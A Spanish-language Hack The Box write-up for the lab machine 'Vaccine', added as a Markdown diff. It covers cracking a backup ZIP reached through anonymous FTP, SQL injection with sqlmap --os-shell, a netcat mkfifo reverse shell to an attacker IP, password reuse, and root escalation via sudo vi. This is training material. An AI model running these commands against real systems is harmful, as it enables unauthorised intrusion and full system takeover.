@@ -1,0 +1,337 @@
+---
+type: writeup
+title: Vaccine
+description: Se centra en la enumeración y el descifrado de contraseñas. El acceso FTP anónimo expone un archivo de copia de seguridad protegido con contraseña que puede descifrarse para recuperar las credenciales de la aplicación web. Estas credenciales otorgan acceso a una aplicación PHP vulnerable a la inyección SQL, lo que permite la ejecución de comandos y una shell inicial como el usuario postgres. Finalmente, se puede lograr la escalada de privilegios abusando de los permisos sudo mal configurados en vi.
+lang: es
+draft: false
+image: ../../../../images/writeups/hackthebox/machines/vaccine/vaccine.png
+platform: hackthebox
+url: https://app.hackthebox.com/machines/Vaccine
+difficulty: veryeasy
+os: linux
+hints: []
+tags: []
+---
+
+## Enumeration
+
+Escaneamos con `nmap` todos los puertos para ver cuáles están abiertos y qué servicios corren en ellos.
+
+```bash
+sudo nmap -p- -sS --min-rate 5000 -Pn -n -vv -oA nmap/allports 10.129.200.166
+```
+
+```
+PORT   STATE SERVICE REASON
+21/tcp open  ftp     syn-ack ttl 63
+22/tcp open  ssh     syn-ack ttl 63
+80/tcp open  http    syn-ack ttl 63
+```
+
+Escaneamos los puertos abiertos para conocer más detalles sobre ellos.
+
+```bash
+nmap -p 21,22,80 -sCV -oA nmap/openports 10.129.200.166
+```
+
+```plaintext
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     vsftpd 3.0.3
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+|_-rwxr-xr-x    1 0        0            2533 Apr 13  2021 backup.zip
+| ftp-syst: 
+|   STAT: 
+| FTP server status:
+|      Connected to ::ffff:10.10.15.41
+|      Logged in as ftpuser
+|      TYPE: ASCII
+|      No session bandwidth limit
+|      Session timeout in seconds is 300
+|      Control connection is plain text
+|      Data connections will be plain text
+|      At session startup, client count was 1
+|      vsFTPd 3.0.3 - secure, fast, stable
+|_End of status
+22/tcp open  ssh     OpenSSH 8.0p1 Ubuntu 6ubuntu0.1 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 c0:ee:58:07:75:34:b0:0b:91:65:b2:59:56:95:27:a4 (RSA)
+|   256 ac:6e:81:18:89:22:d7:a7:41:7d:81:4f:1b:b8:b2:51 (ECDSA)
+|_  256 42:5b:c3:21:df:ef:a2:0b:c9:5e:03:42:1d:69:d0:28 (ED25519)
+80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
+|_http-title: MegaCorp Login
+| http-cookie-flags: 
+|   /: 
+|     PHPSESSID: 
+|_      httponly flag not set
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+```
+
+Enumeramos el servicio `ftp` como usuario `anonymous` sin contraseña.
+
+```bash
+ftp 10.129.200.166
+```
+
+```bash
+ls -la
+```
+
+```plaintext
+-rwxr-xr-x    1 0        0            2533 Apr 13  2021 backup.zip
+```
+
+Descargamos el archivo `backup.zip`.
+
+```bash
+get backup.zip 
+```
+
+```plaintext
+227 Entering Passive Mode (10,129,200,166,42,220).
+150 Opening BINARY mode data connection for backup.zip (2533 bytes).
+226 Transfer complete.
+2533 bytes received in 0.0006 seconds (4.2296 Mbytes/s)
+```
+
+Si intentamos descomprimir el archivo nos pide contraseña. Podemos usar el binario `zip2john` que extrae del archivo ZIP toda la información criptográfica necesaria para que John the Ripper pueda intentar recuperar la contraseña.
+
+```bash
+zip2john backup.zip > hash.txt
+```
+
+Crackeamos el hash obtenido.
+
+```bash
+john  hash.txt --wordlist=/usr/share/wordlists/seclists/Passwords/Leaked-Databases/rockyou.txt
+```
+
+```plaintext
+Using default input encoding: UTF-8
+Loaded 1 password hash (PKZIP [32/64])
+Will run 4 OpenMP threads
+Note: Passwords longer than 21 [worst case UTF-8] to 63 [ASCII] rejected
+Press 'q' or Ctrl-C to abort, 'h' for help, almost any other key for status
+741852963        (backup.zip)     
+1g 0:00:00:00 DONE (2026-07-28 14:48) 14.29g/s 117028p/s 117028c/s 117028C/s 123456..total90
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed
+```
+
+Descomprimimos el archivo `backup.zip` con la contraseña encontrada. Creamos un directorio donde extraer el contenido del archivo.
+
+```bash
+mkdir backup
+```
+
+```bash
+unzip backup.zip -d backup
+```
+
+El archivo descomprimido tiene un archivo `index.php` que contiene información valiosa.
+
+```php
+<!DOCTYPE html>
+<?php
+session_start();
+  if(isset($_POST['username']) && isset($_POST['password'])) {
+    if($_POST['username'] === 'admin' && md5($_POST['password']) === "2cb42f8734ea607eefed3b70af13bbd3") {
+      $_SESSION['login'] = "true";
+      header("Location: dashboard.php");
+    }
+  }
+?>
+<SNIP>
+```
+
+Usamos [CrackStation](https://crackstation.net/) que consulta una base de datos gigantesca de hashes ya calculados previamente, busca si ya existe en su índice, si está, devuelve la contraseña.
+
+![Vaccine MD5 Admin Hash](@images/writeups/hackthebox/machines/vaccine/vaccine-admin-md5.png)
+
+Obtenemos la contraseña `qwerty789`.
+
+El servicio `http` aloja una página de inicio de sesión.
+
+![Vaccine Webservice Login](@images/writeups/hackthebox/machines/vaccine/vaccine-webservice-login.png)
+
+## Exploitation
+
+Iniciamos sesión con las credenciales obtenidas y vemos un dashboard de catálogo de autos.
+
+![Vaccine Dashboard](@images/writeups/hackthebox/machines/vaccine/vaccine-dashboard.png)
+
+La web tiene una función de búsqueda vulnerable a SQLi.
+
+```bash
+sqlmap -r request.req 
+```
+
+```plaintext
+---
+Parameter: search (GET)
+    Type: stacked queries
+    Title: PostgreSQL > 8.1 stacked queries (comment)
+    Payload: search=melvin';SELECT PG_SLEEP(5)--
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 5 columns
+    Payload: search=melvin' UNION ALL SELECT NULL,NULL,(CHR(113)||CHR(98)||CHR(122)||CHR(118)||CHR(113))||(CHR(82)||CHR(65)||CHR(82)||CHR(101)||CHR(119)||CHR(100)||CHR(116)||CHR(72)||CHR(111)||CHR(74)||CHR(107)||CHR(70)||CHR(88)||CHR(70)||CHR(115)||CHR(106)||CHR(85)||CHR(99)||CHR(78)||CHR(78)||CHR(120)||CHR(76)||CHR(89)||CHR(90)||CHR(89)||CHR(116)||CHR(105)||CHR(116)||CHR(88)||CHR(121)||CHR(81)||CHR(118)||CHR(113)||CHR(106)||CHR(114)||CHR(120)||CHR(75)||CHR(100)||CHR(108)||CHR(108))||(CHR(113)||CHR(118)||CHR(98)||CHR(120)||CHR(113)),NULL,NULL-- ywXN
+---
+```
+
+Obtenemos una shell para ejecutar comandos en el sistema.
+
+```bash
+sqlmap -r request.req -p search --os-shell
+```
+
+Nos ponemos en escucha en nuestra máquina atacante.
+
+```bash
+nc -lnvp 1111
+```
+
+En la shell que obtuvimos con sqlmap enviamos una reverse shell.
+
+```bash
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.15.41 1111 >/tmp/f
+```
+
+Estabilizamos la shell obtenida.
+
+```bash
+script /dev/null -c bash
+```
+
+Presionar `ctrl` + `z`.
+
+```bash
+stty raw -echo; fg
+```
+
+```bash
+reset xterm
+```
+
+```bash
+export TERM=xterm
+```
+
+```bash
+export SHELL=bash
+```
+
+```bash
+stty rows 37 columns 171
+```
+
+En el directorio `/var/lib/postgresql` encontramos la flag del user.
+
+```plaintext
+11  user.txt
+```
+
+### User flag
+
+<Callout type="success" title="User flag">
+e******************************7
+</Callout>
+
+## Privilege Escalation
+
+Enumerando algunos directorios damos con el archivo `dashboard.php` dentro del directorio `/var/www/html` que contiene la contraseña para la base de datos pero es reutilizada para iniciar sesión mediante ssh.
+
+```bash
+ls -la
+```
+
+```plaintext
+total 392
+drwxr-xr-x 2 root root   4096 Jul 23  2021 .
+drwxr-xr-x 3 root root   4096 Jul 23  2021 ..
+-rw-rw-r-- 1 root root 362847 Feb  3  2020 bg.png
+-rw-r--r-- 1 root root   4723 Feb  3  2020 dashboard.css
+-rw-r--r-- 1 root root     50 Jan 30  2020 dashboard.js
+-rw-r--r-- 1 root root   2313 Feb  4  2020 dashboard.php
+-rw-r--r-- 1 root root   2594 Feb  3  2020 index.php
+-rw-r--r-- 1 root root   1100 Jan 30  2020 license.txt
+-rw-r--r-- 1 root root   3274 Feb  3  2020 style.css
+```
+
+```bash
+cat dashboard.php
+```
+
+```php
+<SNIP>
+	<?php
+	session_start();
+	if($_SESSION['login'] !== "true") {
+	 header("Location: index.php");
+	 die();
+	}
+	try {
+	 $conn = pg_connect("host=localhost port=5432 dbname=carsdb user=postgres password=P@s5w0rd!");
+	}
+<SNIP>
+```
+
+Iniciamos sesión con el usuario postgres.
+
+```bash
+ssh postgres@10.129.200.166
+```
+
+Listamos los privilegios del usuario actual.
+
+```bash
+sudo -l
+```
+
+```plaintext
+[sudo] password for postgres: 
+Matching Defaults entries for postgres on vaccine:
+    env_keep+="LANG LANGUAGE LINGUAS LC_* _XKB_CHARSET", env_keep+="XAPPLRESDIR XFILESEARCHPATH XUSERFILESEARCHPATH",
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, mail_badpass
+
+User postgres may run the following commands on vaccine:
+    (ALL) /bin/vi /etc/postgresql/11/main/pg_hba.conf
+```
+
+En el sitio [GTFOBins](https://gtfobins.org/gtfobins/vi/) hay algunas formas de escalar privilegios con el binario `vi`. Una de ellas puede ser ejecutando el comando que se nos permite ejecutar como el usuario `postgres`, una vez dentro de `vi` entramos en el modo para ingresar comandos presionando la tecla `esc`, luego ingresamos `:` para entrar en modo línea de comandos e ingresamos `!/bin/sh` para obtener una shell como el usuario `root`.
+
+Una vez con la shell como el usuario `root` verificamos con el comando `id`.
+
+```bash
+id
+```
+
+```plaintext
+uid=0(root) gid=0(root) groups=0(root)
+```
+
+Entramos al directorio `root` y listamos su contenido
+
+```bash
+cd /root
+```
+
+```bash
+ls
+```
+
+```plaintext
+pg_hba.conf  root.txt  snap
+```
+
+Leemos la flag.
+
+```bash
+cat root.txt
+```
+
+### Root flag
+
+<Callout type="success" title="Root flag">
+d******************************9
+</Callout>
